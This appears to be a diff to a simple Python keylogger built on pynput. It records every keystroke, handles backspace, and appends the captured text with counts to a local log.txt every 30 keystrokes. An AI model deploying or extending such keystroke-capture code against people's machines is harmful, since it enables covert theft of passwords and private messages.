@@ -1,13 +1,12 @@
 import os
-
 from pynput.keyboard import Key, Listener
 
+BUFFER_COUNT = 30
 buffer = ""
 keystroke_count = 0
 line_count = 0
 
 def on_press(key):
-	# print("{0} pressed".format(key),end=" ")
 	global buffer, keystroke_count, line_count
 	if hasattr(key, 'char'):
 		buffer += str(key.char)
@@ -16,20 +15,30 @@ def on_press(key):
 		line_count += 1
 	elif key == Key.space:
 		buffer += " "
+	elif key == Key.backspace:
+		buffer = buffer[:-1]
 	keystroke_count += 1
+	if keystroke_count > BUFFER_COUNT:
+		write_log()
 
 def info():
     return """\n\
+=======================\n\
 Text length : {0}\n\
 No of keystrokes : {1}\n\
-No of lines : {2}""".format(len(buffer), keystroke_count,line_count + 1)
+No of lines : {2}\n\
+=======================\n""".format(len(buffer), keystroke_count,line_count + 1)
 
 def write_log():
+	global keystroke_count, line_count, buffer
 	script_directory = os.path.dirname(os.path.abspath(__file__))
 	log_file_path = os.path.join(script_directory, "log.txt")
-	with open(log_file_path,"w") as out:
+	with open(log_file_path,"a") as out:
 		out.write(buffer)
 		out.write(info())
+	buffer = ""
+	keystroke_count = 0
+	line_count = 0
 
 def on_release(key):
 	# break loop on pressing esc
